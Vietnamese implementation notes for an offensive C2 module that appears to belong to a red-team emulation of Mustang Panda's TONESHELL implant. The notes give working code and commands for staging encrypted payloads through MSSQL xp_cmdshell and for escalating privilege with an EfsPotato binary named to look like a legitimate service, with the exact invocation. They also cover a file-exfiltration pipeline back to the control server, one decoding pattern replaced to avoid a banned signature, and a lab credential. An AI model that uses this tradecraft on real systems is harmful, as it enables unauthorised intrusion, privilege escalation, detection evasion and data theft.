# MSSQL Module — Implementation Notes

Module thực thi và staging payload lên IIS01 qua kênh MSSQL xp_cmdshell từ WS01 TONESHELL.
Trạng thái: **hoàn thành và verified** — xpstage + EfsPotato leo quyền thành công.

```
Operator → controlServer REST API → TONESHELL (WS01) → sqlcmd → MSSQL xp_cmdshell → IIS01
```

---

## Files thay đổi

| File | Nội dung |
|---|---|
| `controlServer/mssql/mssql.go` | `StagePayload()` — AES-256-CBC encrypt, base64 chunk, INSERT SQL generation |
| `controlServer/restapi/restapi.go` | Route `POST /api/v1.0/mssql/stage` + handler `StageMssqlPayload` |
| `controlServer/toneshell_shell.py` | Class `XpMssql` + dispatch `xpinit` / `xpshell` / `xpstage` |
| `controlServer/handlers/toneshell/toneshell.go` | `MAX_TASK_CMD_STR` nâng 1024 → 2048 |
| `toneshell-v2/src/shellcode/shellcode.hpp` | `MAX_CMD_LEN` nâng 1024 → 2048 (cần rebuild implant) |

---

## Quyết định kỹ thuật quan trọng

### Drop directory: `C:\ProgramData\`

Temp files (`.bat`, `.txt`, `.ps1`) và payload cuối đều drop vào `C:\ProgramData\`.

`BUILTIN\Users:(CI)(WD,AD,WEA,WA)` trên root `C:\ProgramData\` → `NT SERVICE\MSSQL$SQLEXPRESS` write được vì virtual service accounts là thành viên `BUILTIN\Users`. Subdir có sẵn như `C:\ProgramData\Microsoft\` bị hardened (chỉ RX) — không dùng được.

---

### Escaping: hai layer tách biệt

| Layer | Ký tự | Rule | Xử lý ở |
|---|---|---|---|
| C runtime `-Q "..."` | `"` | `"` → `""` | `_exec_q` |
| T-SQL string `'...'` | `'` | `'` → `''` | `_tsql_escape` |

`_tsql_escape` chỉ escape `'` — không đụng `"`. `_exec_q` double `"` ngay trước khi build command string.

---

### `_sp_oa_write`: `@v NVARCHAR(MAX)` + CHAR(34)

Khi content chứa `"` (e.g. bat file có `"cmd /c ..."`), truyền trực tiếp vào `sp_OAMethod` parameter không được vì:
- sp_OAMethod không nhận expression (`'a'+CHAR(34)+'b'`) → `Msg 102: Incorrect syntax near '+'`
- Nếu để `"` trong T-SQL literal và dùng `_exec_q`, `_exec_q` sẽ double thành `""` → sqlcmd parser treat `""` là end-quote+start-quote → phần sau `"` bị parse sai

Fix: tách chunk tại `"`, nối bằng `CHAR(34)`, gán vào `@v` trước, rồi truyền `@v`:

```python
segs     = chunk.split('"')
val_expr = '+CHAR(34)+'.join(f"'{self._tsql_escape(s)}'" for s in segs)
tsql = (
    "DECLARE @f INT,@x INT,@v NVARCHAR(MAX);"
    "EXEC sp_OACreate 'Scripting.FileSystemObject',@f OUT;"
    f"EXEC sp_OAMethod @f,'OpenTextFile',@x OUT,'{path}',{mode},1;"
    f"SET @v={val_expr};"
    "EXEC sp_OAMethod @x,'Write',NULL,@v;"
    ...
)
```

---

### `mssql.go`: `USE tempdb;` + single-part names

GRANT không hỗ trợ three-part object name (`tempdb..stg`) → `Msg 4610: You can only grant or revoke permissions on objects in the current database`.

Fix: thêm `USE tempdb;` vào đầu SQL file, dùng single-part `stg` cho toàn bộ DDL/DML/GRANT sau đó.

---

### PowerShell scripts: single-quote xuyên suốt

Connection string và tất cả giá trị nhúng vào PS script dùng `'...'` thay vì `"..."` để `"` không xuất hiện trong T-SQL string và trigger `_exec_q` double-escape.

SqlClient dùng dấu phẩy cho port (`host,port`), sqlcmd dùng dấu hai chấm — cần `self._host.replace(':', ',')` trước khi build connection string.

---

### Cleanup: `cmd /c del` + `_exec_q` trực tiếp cho DROP TABLE

`del` là cmd builtin, không phải executable — cần `cmd /c del /f {remote_sql}` để xóa SQL file trên WS01.

DROP TABLE dùng `_exec_q` trực tiếp thay vì nested `xpshell cmd "sqlcmd..."` để tránh quoting hell lồng nhau.

---

### `cmd_put_wait` thay vì `cmd_put`

Dùng blocking variant để đảm bảo SQL file transfer xong trên WS01 trước khi chạy `sqlcmd -i` — tránh race condition.

---

### EfsPotato (`CertEnrollSvc.exe`): yêu cầu invocation

`CertEnrollSvc.exe` kiểm tra `GetFileType(stdin) == FILE_TYPE_PIPE` khi khởi động:
- Stdin là pipe (case mặc định khi chạy qua xp_cmdshell) → cố đọc PE bytes từ stdin → fail → return ngay, không chạy gì
- Stdin không phải pipe → đọc `args[0]` làm command line

Invocation đúng:
```
C:\ProgramData\CertEnrollSvc.exe "cmd /c <cmd>" lsarpc 0<nul
```

- `args[0]` — command line cho `CreateProcessWithToken`
- `args[1]` — EFS endpoint (`lsarpc`); phải là giá trị hợp lệ, nếu không binary return ngay
- `0<nul` — redirect stdin từ NUL, giải quyết FILE_TYPE_PIPE check

`<` trong bat file là literal (không bị interpret ở layer T-SQL/sqlcmd), chỉ được interpret khi cmd.exe chạy bat.

---

## Verified flow

```
xpinit IIS01\SQLEXPRESS:1433 svc_app_dev D3vPortal!2025
xpstage CertEnrollSvc.exe
xpshell cmd C:\ProgramData\CertEnrollSvc.exe "cmd /c whoami /priv > C:\ProgramData\out.txt 2>&1" lsarpc 0<nul
xpshell cmd type C:\ProgramData\out.txt
```

Credential: `svc_app_dev / D3vPortal!2025` · Instance: `IIS01\SQLEXPRESS` · Port: `1433`

---

## xpexfil + FILE_UPLOAD fixes (2026-08-20/21)

Bổ sung lệnh `xpexfil` và sửa hai lỗi chuỗi trong pipeline FILE_UPLOAD.

### Files thay đổi

| File | Thay đổi |
|---|---|
| `controlServer/toneshell_shell.py` | `_build_decrypt_ps`, `_build_plain_ps` refactor; thêm `_build_exfil_insert_ps`, `_build_exfil_extract_ps`, `cmd_xpexfil`, `cmd_get_wait` |
| `controlServer/handlers/toneshell/toneshell.go` | `RegisterTaskOutput` bổ sung cho nhánh `RESP_FILE_UPLOAD` |

---

### Base64 refactor: `_build_decrypt_ps` + `_build_plain_ps`

`[Convert]::FromBase64String` (pattern bị cấm) đã được thay bằng `FromBase64Transform` CryptoStream trong cả hai hàm build PS, bao gồm cả bước decode key (design doc dự kiến key giữ `[Convert]::FromBase64String`, nhưng code thực tế dùng `FromBase64Transform` luôn để nhất quán):

```powershell
# Key decode (áp dụng trong cả _build_decrypt_ps, _build_exfil_insert_ps, _build_exfil_extract_ps)
$kb=[System.Text.Encoding]::ASCII.GetBytes('<key_b64>');
$kt=New-Object System.Security.Cryptography.FromBase64Transform;
$kms=New-Object System.IO.MemoryStream;
$kcs=New-Object System.Security.Cryptography.CryptoStream($kms,$kt,[System.Security.Cryptography.CryptoStreamMode]::Write);
$kcs.Write($kb,0,$kb.Length);$kcs.FlushFinalBlock();$k=$kms.ToArray();
```

AES decrypt logic không đổi. `mssql.go` không cần sửa — `base64.StdEncoding` tương thích với `FromBase64Transform`.

---

### Lệnh mới: `xpexfil`

Exfil đối xứng: IIS01 → (MSSQL) → WS01 → (TONESHELL FILE_UPLOAD) → controlServer.

**Pipeline:**
- A — IIS01 PowerShell (qua `cmd_xpshell_psh`): `ReadAllBytes` → AES-256-CBC encrypt (random IV prepend) → `ToBase64Transform` CryptoStream → SqlClient INSERT 8000-char chunks vào `tempdb..exfil`
- B — WS01 PowerShell (qua `cmd_exec_raw`): SqlClient SELECT `tempdb..exfil` → `FromBase64Transform` CryptoStream → AES decrypt → `WriteAllBytes` ra `C:\Windows\Temp\<local_name>`
- C — cleanup DB: DROP `tempdb..exfil` (không phụ thuộc WS01, nên chạy trước GET-W)
- D — pull + del: `cmd_get_wait` (blocking) → del WS01 temp

**Deviation từ design doc:** design mô tả cleanup sau pull (D sau C). Code thực tế đảo thứ tự: DROP TABLE trước (bước C), rồi `cmd_get_wait` (bước D), rồi `del /f`. Lý do: DROP TABLE không có dependency vào WS01, làm sớm tránh giữ bảng lâu hơn cần.

Key: `os.urandom(32)` base64-encoded trực tiếp trong `cmd_xpexfil`, không qua Go server.

---

### `cmd_get_wait` — blocking variant cho FILE_UPLOAD

`cmd_get` (fire-and-forget) vẫn giữ nguyên. `cmd_get_wait` bổ sung:

```python
def cmd_get_wait(self, remote_path: str):
    task = {"id": TS_FILE_UPLOAD, "taskNum": ..., "args": remote_path}
    info = self._post_task(task)
    self._poll_output(info[TASK_GUID_KEY], timeout_s=180)
```

Dùng trong `cmd_xpexfil` để đảm bảo `del /f` chỉ chạy sau khi file đã upload xong.

---

### Bug fix: `toneshell.go` — `RegisterTaskOutput` cho `RESP_FILE_UPLOAD`

**Root cause:** `_poll_output` không bao giờ return với FILE_UPLOAD task vì `taskStatus` không bao giờ đạt `TASK_STATUS_FINISHED`. Nhánh `RESP_FILE_UPLOAD` trong `TASK_COMPLETE` case chỉ log success, không gọi `RegisterTaskOutput` → `FinishTask()` không được gọi.

**Fix** (`toneshell.go`, nhánh `RESP_FILE_UPLOAD`):

```go
// Trước:
} else if taskType == RESP_FILE_UPLOAD {
    o.baseHandler.HandlerLogSuccess("Successfully uploaded file %s", filePath)
}

// Sau:
} else if taskType == RESP_FILE_UPLOAD {
    o.baseHandler.HandlerLogSuccess("Successfully uploaded file %s", filePath)
    o.baseHandler.RegisterTaskOutput(sessionId, []byte{})
}
```

Call chain: `RegisterTaskOutput` → `ForwardTaskOutput` → POST `/api/v1.0/session/{id}/task/output` → `sessions.SetTaskOutput(guid, "", true)` → `s.Task.FinishTask()` → `Status = TASK_STATUS_FINISHED` → `_poll_output` detect và return.

---

### Lab infrastructure: `files/` directory

`HandleFileUpload` trong `toneshell.go` ghi file vào `util.UploadDir = filepath.Join(ProjectRoot, "files")`. Directory này phải tồn tại thủ công — server không auto-create:

```bash
mkdir /home/kali/Tools/rce-and-c2/mustang-panda-emulation/controlServer/files
```

Nếu thiếu: `open .../files/<random>: no such file or directory` — task vẫn FINISHED (vì `RegisterTaskOutput` được gọi sau chunk error), nhưng file content bị mất.
